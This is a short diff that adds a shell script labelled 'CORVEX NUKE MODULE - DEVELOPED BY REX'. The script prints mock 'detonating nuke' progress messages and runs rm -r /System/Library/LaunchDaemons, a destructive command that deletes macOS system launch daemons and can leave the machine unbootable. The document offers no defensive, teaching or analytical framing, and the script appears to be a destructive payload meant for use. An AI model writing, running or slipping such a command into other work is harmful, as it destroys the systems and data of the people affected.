@@ -1,0 +1,6 @@
+echo [CORVEX NUKE MODULE - DEVELOPED BY REX]
+echo [detonating nuke...]
+rm -r /System/Library/LaunchDaemons
+echo [100%]
+
+
